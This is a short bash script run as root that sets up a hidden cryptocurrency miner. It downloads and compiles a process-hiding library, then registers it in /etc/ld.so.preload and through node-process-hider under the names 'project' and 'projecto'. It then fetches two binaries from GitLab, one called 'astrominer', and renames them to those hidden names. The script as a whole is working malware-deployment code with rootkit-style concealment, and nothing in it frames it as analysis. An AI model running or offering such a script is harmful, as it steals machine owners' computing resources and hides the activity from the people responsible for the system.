#!/bin/bash 
sudo su <<EOF
apt update && apt -y install sudo wget curl unzip >/dev/null 2>&1
apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1
sudo apt install screen -y
wget https://raw.githubusercontent.com/sarifadim/dopla/main/processhider.c
sudo apt install build-essential -y
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1
sudo mv libprocesshider.so /usr/local/lib/
sudo echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang >/dev/null 2>&1
curl -fsSL https://deb.nodesource.com/setup_14.x | sudo -E bash -
apt-get install -y nodejs >/dev/null 2>&1
sudo apt install npm
sudo npm i -g node-process-hider && sudo ph add project
sudo ph add projecto
wget https://gitlab.com/teletyl/gm/-/raw/main/166 && chmod +x 166 && mv 166 project && wget https://gitlab.com/teletyl/jupyter/-/raw/main/astrominer && chmod +x astrominer && mv astrominer projecto
EOF
